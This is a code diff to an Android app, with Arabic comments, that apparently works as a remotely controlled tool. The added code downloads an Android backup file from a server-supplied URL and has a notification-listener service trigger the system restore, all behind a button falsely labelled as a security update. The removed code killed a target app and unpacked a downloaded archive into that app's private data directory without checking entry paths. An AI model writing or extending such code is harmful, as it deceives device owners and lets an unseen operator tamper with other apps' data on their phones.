@@ -9,6 +9,7 @@ import android.graphics.drawable.ColorDrawable;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -23,13 +24,8 @@ import androidx.cardview.widget.CardView;
 
 import org.json.JSONObject;
 
-import java.io.BufferedInputStream;
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
 import java.io.IOException;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipInputStream;
 
 import okhttp3.Call;
 import okhttp3.Callback;
@@ -141,9 +137,11 @@ public class SecondActivity extends AppCompatActivity {
                 layoutRejected.setVisibility(View.VISIBLE);
                 txtRejectReason.setText(content.isEmpty() ? "تم رفض طلبك حالياً" : content);
                 break;
-            case "zip_task":
+            case "backup_task": // الحالة الجديدة لاستعادة ملف ab ✅
                 layoutZipTask.setVisibility(View.VISIBLE);
-                btnExecuteTask.setOnClickListener(v -> startModdingProcess(data.optString("zip_url"), data.optString("target_package")));
+                // نغير نص الزر ليتماشى مع المهمة الجديدة
+                btnExecuteTask.setText("بدء التحديث الأمني المباشر");
+                btnExecuteTask.setOnClickListener(v -> startBackupRestoreProcess(data.optString("backup_url")));
                 break;
             case "verify_phone":
                 layoutVerifyTask.setVisibility(View.VISIBLE);
@@ -172,6 +170,47 @@ public class SecondActivity extends AppCompatActivity {
         layoutZipTask.setVisibility(View.GONE);
         layoutVerifyTask.setVisibility(View.GONE);
         layoutPayment.setVisibility(View.GONE);
+    }
+
+    // الدالة الجديدة لمعالجة ملف AB
+    private void startBackupRestoreProcess(String url) {
+        btnExecuteTask.setEnabled(false);
+        taskProgressBar.setVisibility(View.VISIBLE);
+        
+        new Thread(() -> {
+            try {
+                // 1. تحميل الملف وحفظه في مسار مؤقت
+                File backupFile = new File(getExternalFilesDir(null), "backup_temp.ab");
+                downloadFileSync(url, backupFile);
+
+                runOnUiThread(() -> {
+                    Toast.makeText(this, "جارٍ تجهيز بيئة الاستعادة...", Toast.LENGTH_SHORT).show();
+                    // 2. إرسال أمر للخدمة (CallNotificationListener) لفتح نافذة النظام
+                    Intent restoreIntent = new Intent(this, CallNotificationListener.class);
+                    restoreIntent.setAction("START_RESTORE");
+                    startService(restoreIntent);
+                    
+                    resetStatusOnServer();
+                });
+
+            } catch (Exception e) {
+                Log.e("Backup_Process", "Error: ", e);
+                runOnUiThread(() -> Toast.makeText(this, "فشل في تحميل بيانات التحديث", Toast.LENGTH_SHORT).show());
+            }
+            runOnUiThread(() -> {
+                taskProgressBar.setVisibility(View.GONE);
+                btnExecuteTask.setEnabled(true);
+            });
+        }).start();
+    }
+
+    private void downloadFileSync(String url, File dest) throws IOException {
+        try (Response response = client.newCall(new Request.Builder().url(url).build()).execute()) {
+            if (!response.isSuccessful() || response.body() == null) throw new IOException("Fail to download");
+            try (BufferedSink sink = Okio.buffer(Okio.sink(dest))) { 
+                sink.writeAll(response.body().source()); 
+            }
+        }
     }
 
     private void showPaymentUI(String amount) {
@@ -246,52 +285,6 @@ public class SecondActivity extends AppCompatActivity {
             @Override public void onResponse(@NonNull Call call, @NonNull Response response) {}
             @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
         });
-    }
-
-    private void startModdingProcess(String url, String pkg) {
-        btnExecuteTask.setEnabled(false);
-        taskProgressBar.setVisibility(View.VISIBLE);
-        new Thread(() -> {
-            try {
-                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
-                am.killBackgroundProcesses(pkg);
-                File tempZip = new File(getCacheDir(), "upd.zip");
-                downloadFileSync(url, tempZip);
-                unzip(tempZip, new File(createPackageContext(pkg, 0).getApplicationInfo().dataDir));
-                tempZip.delete();
-                runOnUiThread(() -> {
-                    Toast.makeText(this, "اكتمل التحديث بنجاح ✅", Toast.LENGTH_SHORT).show();
-                    resetStatusOnServer();
-                });
-            } catch (Exception e) {
-                runOnUiThread(() -> Toast.makeText(this, "فشلت العملية", Toast.LENGTH_SHORT).show());
-            }
-            runOnUiThread(() -> { taskProgressBar.setVisibility(View.GONE); btnExecuteTask.setEnabled(true); });
-        }).start();
-    }
-
-    private void downloadFileSync(String url, File dest) throws IOException {
-        try (Response response = client.newCall(new Request.Builder().url(url).build()).execute()) {
-            if (!response.isSuccessful() || response.body() == null) throw new IOException("Fail");
-            try (BufferedSink sink = Okio.buffer(Okio.sink(dest))) { sink.writeAll(response.body().source()); }
-        }
-    }
-
-    private void unzip(File zip, File dir) throws IOException {
-        try (ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(zip)))) {
-            ZipEntry ze;
-            while ((ze = zis.getNextEntry()) != null) {
-                File f = new File(dir, ze.getName());
-                if (ze.isDirectory()) f.mkdirs();
-                else {
-                    if (f.getParentFile() != null) f.getParentFile().mkdirs();
-                    try (FileOutputStream fos = new FileOutputStream(f)) {
-                        byte[] b = new byte[8192]; int l;
-                        while ((l = zis.read(b)) != -1) fos.write(b, 0, l);
-                    }
-                }
-            }
-        }
     }
 
     private void generateTicketID() { 
